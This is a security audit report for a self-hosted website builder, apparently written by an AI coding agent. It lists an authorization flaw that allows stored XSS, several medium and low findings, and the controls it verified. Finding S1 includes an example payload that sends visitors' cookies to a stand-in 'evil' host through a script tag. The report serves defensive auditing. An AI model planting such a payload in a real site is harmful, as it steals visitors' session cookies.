# SECURITY.md — Security audit (Pass 4 of REVIEW.md)

Branch: `audit/security` (stacked on `chore/architecture-boundaries`). Threat model per REVIEW.md: single-tenant self-hosted visual builder; authed admin SPA at `/admin`, public published site at root; user-authored JSON trees compiled to static HTML. Two parallel read-only audits (compile-pipeline XSS; admin/server surface), each finding grep- or read-verified.

## Bottom line

The pipeline is well-built. **No accidental XSS** from node content: text is escaped and rich text allowlist-sanitized at emit time, every attribute is escaped, `href` is scheme-gated, theme tokens are strictly validated. **No unauthenticated or wrong-role path to any mutating endpoint**; CSRF is covered by a global origin check + `SameSite=Lax`; uploads are validated by magic bytes + size caps; path traversal and zip-slip are defended twice.

The one CRITICAL/HIGH item is an **authorization** issue, not an escaping one: a `contributor` can write the whole project store, and the store carries `customCode` (raw JS emitted into the published site on the next publish). Its fix is behavior-shaping and partially documented as intentional — **escalated to QUESTIONS.md item 14, not fixed autonomously** (global rule 11). All MED/LOW stay here for human triage per Pass-4 Phase B.

## Phase B outcome

No autonomous code change. The sole CRITICAL/HIGH finding (S1) requires altering the contributor trust model that CLAUDE.md documents as an intentional UI-only gap, and cannot be fixed safely without contributor-autosave e2e coverage this repo lacks. A concrete, low-risk patch is written up in QUESTIONS.md item 14 for owner review. MED/LOW findings are recorded below.

---

## CRITICAL / HIGH

### S1 — Contributor → stored XSS on the published origin (HIGH; CRITICAL if contributors are untrusted)
**`server/index.mjs:340` + `server/export.mjs:464,506-509`.** `handleStore` gates writes with only `if (!sessionUser(req))` — any authenticated user, **including a `contributor`**, can `PUT /api/store/superbird-project:main` with an arbitrary body. The stored project includes `settings.customCode.head/body` and per-page `customCode`, which the exporter emits **verbatim** into `<head>`/as `<script>` on publish. A preview-only contributor can therefore plant `settings.customCode.head = "<script>fetch('//evil/?c='+document.cookie)</script>"`; the next publish by an editor/admin ships it to every visitor. The same write can overwrite `settings.smtp` or corrupt the whole project blob.

CLAUDE.md:86 documents the *structural* contributor restriction as "UI-enforced only … intentional gap." Code-injection via `customCode` and credential overwrite via `smtp` plausibly exceed that intent — but closing it changes the auth model, so it is escalated rather than patched here.

**Recommended fix (QUESTIONS.md item 14):** on a contributor `PUT` to a project key, load the current stored value and reject (403) if `settings.customCode`, any page `customCode`, or `settings.smtp` would change. Contributors never legitimately edit those fields (PreviewView has no code/settings surface), so the guard rejects only anomalous writes. Needs contributor-autosave verification before shipping.

---

## MEDIUM (triage — left in place)

- **S2 — CSS injection via unescaped `url()`** (`src/lib/shared/background.js:39-42`, emitted `export.mjs:236`; also `fonts.family` at `export.mjs:469`). `node.background` flows raw into `background-image:url(${url})`; `escapeHtml` protects the attribute quotes but not `; : ( )`, so CSS declarations can be injected (full-viewport overlay / clickjacking / CSS exfil). No JS execution. Fix: validate the URL shape (reject `)`, quotes, whitespace) and wrap as `url("…")`; allowlist `fonts.family`.
- **S3 — Session tokens stored in plaintext at rest** (`server/auth.mjs:183-188` → `sessions.json`). A leaked data dir hands over every live session. Fix: key the session map by `sha256(token)`, hash on lookup; raw token stays only in the cookie. (Safe, self-contained — a good first human fix.)
- **S4 — Invite raw token stored at rest** (`server/auth.mjs:294,297`) contradicts the file's own "stored ONLY as sha256" comment. Leaked `invites.json` → accept any pending invite at its role. Fix: drop the raw `token` field; use the existing regenerate flow to re-issue links.
- **S5 — No CSP on exported site or admin SPA** (`server/index.mjs:433` sends only `nosniff`). With S1, there is no containment layer on the public origin. Fix: emit a CSP for exported pages + admin shell (must accommodate owner `customCode` — nonces or documented `unsafe-inline`).
- **S6 — Exported SVG relies on a host CSP the export doesn't emit** (`server/export-media.mjs:110`, upload scrub `server/media.mjs:178`). SVGs are copied verbatim into `assets/media/<hash>.svg`; the exported media path is `SAFE_HREF`-linkable, so an SVG slipping past the regex scrubber executes on direct navigation without the serving-time CSP. Fix: re-run/upgrade SVG sanitization at export, or emit CSP for the static site.

## LOW (triage — left in place)

- **S7 — `src`/`background`/`swapSrc` not scheme-allowlisted** (unlike `href`). Non-exploitable today (no `iframe`/`script`/`object`/`embed`/`svg` in the element registry, so `src` only lands on `img`/`video`/`input`). **Becomes CRITICAL the moment an embed/iframe element type is added.** Fix now: run these through `SAFE_HREF` with a `data:image|video` exception.
- **S8 — rate-limit key is `req.socket.remoteAddress`** (`index.mjs:168,205`); behind the documented reverse-proxy deploy all clients share one bucket. Fix: trusted `X-Forwarded-For` under a `TRUST_PROXY` flag.
- **S9 — account-lockout DoS**: 10 failed logins by *email* lock an account 15 min (`auth.mjs:391-393`); a known email → targeted lockout. Fix: prefer IP-based or exponential backoff.
- **S10 — publish snapshot barely validated** (`index.mjs:410` checks only `pages` is a non-empty array); relies on exporter defensiveness. Fix: shape/size-bound the snapshot before export.
- **S11 — per-user store disk quota absent** (media has one; store doesn't) → disk-fill DoS across unlimited keys. Fix: cap key count / total bytes per project.
- **S12 — `PUBLISH_TOKEN` compared non-timing-safe** (`index.mjs:399`). Low impact. Fix: `timingSafeEqual`.
- **S13 — `/api/users/members` exposes every member's email to contributors** (`index.mjs:249`, `auth.mjs:288`). Labeled intentional; confirm desired.
- **S14 — `/api/auth/update` changes email without re-auth** (password change requires `currentPassword`, email does not, `index.mjs:135-165`). Fix: require re-auth for email change.

## Verified SAFE (so the owner needn't re-check)

Text/bound-field/reference content escaped at `export.mjs:416`; `sanitizeRich` (`richtext.js:35-78`) allowlist survived event-handler, `<script>/<iframe>/<svg>`, `javascript:`/`data:`/entity/case/malformed-nesting bypass attempts; all attributes + data-* JSON escaped (`export.mjs:225-278`); `href` scheme-gated (`SAFE_HREF`) + escaped; SEO/head/title/favicon/fonts-URL escaped or prefix-checked; theme tokens strictly validated (`tokens.js:18-34`); runtime JSON/script blobs breakout-neutralized. Exporter and Vue preview share the same sanitizer/registry modules by import — no dev/prod drift. Server: every mutating route gated by `sessionUser`/role or CI bearer; publish is server-side contributor-403 (`index.mjs:399-404`); global origin check on all non-GET `/api` (`index.mjs:475`) + `SameSite=Lax`; `HttpOnly`/conditional-`Secure` cookies; `randomBytes(32)` session + invite tokens; scrypt + `timingSafeEqual` login with dummy-hash user-enumeration defense; single-use hashed-lookup invites with expiry; store key regex blocks traversal; magic-byte + size-cap + quota + pixel-bomb + SVG-scrub upload validation; zip-slip blocked by `safePath` + a write-path backstop; public snapshot redacts `smtp`, drafts and comments; media served with `nosniff` + no-script CSP; no CORS; no secrets in responses.

## UNSURE — resolved during the run
- **Settings schema — RESOLVED SAFE.** `ProjectSettings` (`src/types/editor.ts:194`, defaults `src/lib/settings.ts:36`) has exactly one credential field: `smtp {host,port,user,password,from}`. No API/deploy-token field. `handleGet` redacting only `settings.smtp` is complete.
- **Bundle secret scan — RESOLVED SAFE.** `scrypt`/`passwordHash`/`timingSafeEqual`/`PUBLISH_TOKEN`/`sb_session` logic appear in **0** client bundle files (all server-only). The lone `smtp.password` reference (`useEditorBoot`) is the admin editing their own SMTP settings via the authed store; the public snapshot still redacts it, so no unauthenticated leak.
